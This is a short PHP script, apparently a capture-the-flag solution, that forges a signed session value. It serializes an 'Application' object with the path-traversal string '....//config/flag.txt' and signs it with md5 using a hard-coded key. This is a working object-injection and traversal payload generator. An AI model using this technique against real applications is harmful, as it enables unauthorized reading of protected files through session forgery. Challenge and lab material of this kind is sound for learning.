<?php
$eancrykey = "EzblrbNS";
$session = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}'; 

echo $session.md5($eancrykey.$session);//serilized + hash

?>
